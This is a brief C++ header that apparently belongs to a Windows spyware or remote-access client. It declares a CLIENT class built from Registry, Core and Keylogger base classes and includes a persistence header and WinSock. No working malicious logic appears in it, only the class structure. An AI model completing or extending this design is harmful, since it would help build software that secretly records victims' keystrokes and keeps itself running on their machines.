#pragma once
#include <WS2tcpip.h>
#include <string>
#include "persistence.h"
#include "core.h"
#include "keylogger.h"
using namespace std;

class CLIENT : public Registry, public Core, public Keylogger
{
public:
	CLIENT();
};